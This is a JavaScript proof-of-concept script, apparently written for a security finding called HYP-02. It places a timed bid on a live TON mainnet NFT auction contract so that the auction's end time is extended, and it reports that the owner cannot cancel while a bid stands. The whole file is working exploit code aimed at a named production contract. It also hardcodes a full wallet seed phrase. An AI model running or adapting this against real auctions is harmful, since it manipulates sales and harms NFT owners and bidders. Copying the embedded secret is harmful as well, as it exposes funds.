/**
 * HYP-02 Mainnet PoC — bid in step_time window → extend end_time
 * step_time = 300s, pre-fetch seqno 30s early
 */

const { mnemonicToWalletKey } = require('./nft-contracts/node_modules/@ton/crypto');
const { WalletContractV4, TonClient, internal, toNano, Address, beginCell } = require('./nft-contracts/node_modules/@ton/ton');
const { external, storeMessage } = require('./nft-contracts/node_modules/@ton/core');

const MNEMONIC   = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';
const AUCTION    = Address.parse('0:4401c1ccde01172cdc3b59f3c0c67eb9e1a65a6878cf9758660ce41fb69a82a9');
const STEP_TIME  = 300; // confirmed from get_auction_data slot[20]

const client = new TonClient({ endpoint: 'https://toncenter.com/api/v2/jsonRPC' });
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
async function withRetry(fn, max=6) {
  for (let i=1;i<=max;i++) {
    try { return await fn(); } catch(e) {
      if (i<max) { await sleep(e.message?.includes('429') ? 8000*i : 2000); continue; }
      throw e;
    }
  }
}

async function getEndTime() {
  const r = await withRetry(() => client.runMethod(AUCTION, 'get_auction_data'));
  r.stack.readBigNumber(); // activated
  r.stack.readBigNumber(); // end?
  return Number(r.stack.readBigNumber()); // end_time
}

async function main() {
  const key = await mnemonicToWalletKey(MNEMONIC.split(' '));
  const raw = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });
  const opened = client.open(raw);

  const endTimeBefore = await getEndTime();
  const bidWindow = endTimeBefore - STEP_TIME;
  const prefetchAt = bidWindow - 30;
  const now = Date.now() / 1000;

  console.log('=== HYP-02 Mainnet Bid PoC v2 ===');
  console.log('end_time:     ', new Date(endTimeBefore*1000).toISOString());
  console.log('bid window:   ', new Date(bidWindow*1000).toISOString(), '(T -', STEP_TIME, 's)');
  console.log('pre-fetch at: ', new Date(prefetchAt*1000).toISOString(), '(window - 30s)');
  console.log('now:          ', new Date().toISOString());

  // Wait for pre-fetch moment
  const waitPrefetch = Math.max(0, (prefetchAt - now) * 1000);
  if (waitPrefetch > 0) {
    console.log(`\nWaiting ${Math.round(waitPrefetch/1000)}s to pre-fetch seqno...`);
    await sleep(waitPrefetch);
  }

  // Pre-fetch seqno and build TX 30s before window
  console.log('Pre-fetching seqno at', new Date().toISOString(), '...');
  const seqno = await withRetry(() => opened.getSeqno());
  console.log('seqno:', seqno);

  // Build TX offline (no network calls)
  const body = raw.createTransfer({
    seqno,
    secretKey: key.secretKey,
    messages: [internal({ to: AUCTION, value: toNano('1.05'), bounce: true })],
  });
  const ext = external({ to: raw.address, init: null, body });
  const boc = beginCell().store(storeMessage(ext)).endCell().toBoc();
  console.log('TX built offline, ready to fire');

  // Wait for exact bid window open
  const waitWindow = Math.max(0, (bidWindow - Date.now()/1000) * 1000);
  if (waitWindow > 0) {
    console.log(`Waiting ${Math.round(waitWindow/1000)}s for bid window...`);
    await sleep(waitWindow);
  }

  // Fire immediately — no network calls needed
  console.log('FIRING bid at', new Date().toISOString(), '...');
  await withRetry(() => client.sendFile(boc));
  console.log('TX sent! Waiting 25s for confirmation...');
  await sleep(25000);

  // Check result
  const endTimeAfter = await getEndTime();
  const delta = endTimeAfter - endTimeBefore;

  console.log('\n=== RESULT ===');
  console.log('end_time before:', new Date(endTimeBefore*1000).toISOString());
  console.log('end_time after: ', new Date(endTimeAfter*1000).toISOString());
  console.log('delta:          ', delta, 's (expected', STEP_TIME, 's)');
  console.log(delta > 0 ? `✅ EXTENSION CONFIRMED +${delta}s` : '❌ No extension');

  if (delta > 0) {
    console.log('\n✅ HYP-02 CONFIRMED ON MAINNET (v3r3 production contract)');
    console.log('   Original end_time:', new Date(endTimeBefore*1000).toISOString());
    console.log('   Extended to:      ', new Date(endTimeAfter*1000).toISOString());
    console.log('   NFT owner cancel blocked while last_bid > 0 (exit 1009)');
    console.log('   Auction tonscan:', 'https://tonscan.org/address/' + AUCTION.toRawString());
  }
}

main().catch(console.error);
